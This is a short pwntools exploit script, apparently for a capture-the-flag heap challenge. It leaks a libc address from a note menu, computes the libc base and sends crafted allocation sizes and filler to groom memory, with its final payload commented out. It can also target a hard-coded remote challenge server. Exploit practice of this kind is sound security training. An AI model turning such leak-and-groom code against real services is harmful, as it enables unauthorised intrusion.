#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")
libc = ELF("./libc.so.6")

local = True 
if local:
    p = process("./chall")
    gdb.attach(p,'''c''')
else:
    p = remote('103.162.14.240', 15001)

elf = context.binary = ELF('./chall', checksec=False)


p.sendlineafter(b">", b"1")
p.recvuntil(b"Addr of note 0 is 0x")
libc.address = int(p.recv(12),16) - 2277376
leak = libc.address + 2277376
print("[+]Libc_leak:    ", hex(leak))
print("[+]Libc_base:    ", hex(libc.address))

p.sendlineafter(b">", b"2")
p.sendlineafter(b"=", b"0")
p.sendlineafter(b"=", b"4000")
p.sendline(b"bbbbbbbbbbbbbbbbbbbbbbbbbbbb")

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"2")
p.sendlineafter(b"=", b"1")
p.sendlineafter(b"=", b"100000")


p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"2")
p.sendlineafter(b"=", b"2")
p.sendlineafter(b"=", b"100")
p.sendline(b"aaaaaaaaaaaaaaaaaaa")
'''

'''



#p.sendlineafter(b">", b"1" + b"a"*7 + b"\x00" * (4*8) + p64(leak))




p.interactive()